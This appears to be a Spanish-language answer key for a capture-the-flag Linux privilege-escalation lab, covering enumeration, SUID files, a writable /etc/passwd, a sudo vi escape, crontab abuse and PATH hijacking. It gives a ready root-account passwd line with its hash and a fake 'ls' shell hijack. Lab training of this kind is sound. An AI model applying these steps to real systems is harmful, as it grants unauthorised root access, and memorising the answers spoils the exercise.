## Enumeración

¿Cuál es el nombre de host del objetivo?
 
    polobox

Mire la salida de / etc / passwd ¿cuántos "usuarios [x]" hay en el sistema?
 
    8

¿Cuántos shells disponibles hay en el sistema?
 
    4

¿Cuál es el nombre del script bash que cron está configurado para ejecutarse cada 5 minutos?
 
    autoscript.sh

¿Qué archivo crítico ha tenido sus permisos cambiados para permitir que algunos usuarios escriban en él?

    /etc/passwd

## Abuso de archivos SUID / GUID

¿Cuál es la ruta del archivo en el directorio de user3 que le llama la atención?

    /home/user3/shell

## Exploiting Writeable /etc/passwd

Habiendo leído la información anterior, ¿en qué dirección de escalada de privilegios es este ataque?
 
    vertical

Antes de agregar nuestro nuevo usuario, primero debemos crear un hash de contraseña compatible para agregar. Hacemos 
esto usando el comando: "openssl passwd -1 -salt [salt] [contraseña]"
¿Cuál es el hash creado al usar este comando con la sal, "nuevo" y la contraseña "123" ?
 
    $1$new$p7ptkEKU1HnaHpRtzNizS1

¡Estupendo! Ahora debemos tomar este valor y crear una nueva cuenta de usuario root. ¿Cómo sería la entrada 
/ etc / passwd para un usuario root con el nombre de usuario "nuevo" y el hash de contraseña que creamos antes?

    new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/bin/bash:

## Escapar del editor de Vi 

Vamos a usar el "sudo -l" de comandos, lo que requiere este usuario (o no necesita) para ejecutar vi como root?

    NOPASSWD

## Explotando Crontab

¿Cuál es la bandera para especificar una carga útil en msfvenom?

    -p

¿En qué directorio se encuentra "autoscript.sh"?

    /home/user4/Desktop

##  Explotación de la variable PATH

Vayamos al directorio de inicio de user5 y ejecutemos el archivo "script" . ¿Qué comando creemos que está ejecutando?

    ls

¿Cómo se vería el comando para abrir un shell bash, escribiendo en un archivo con el nombre del ejecutable que estamos 
imitando?
 
    echo "/bin/bash" > ls

¡Estupendo! Ahora que hicimos nuestra imitación, necesitamos convertirla en ejecutable. ¿Qué comando ejecutamos para 
hacer esto?

    chmod +x  ls

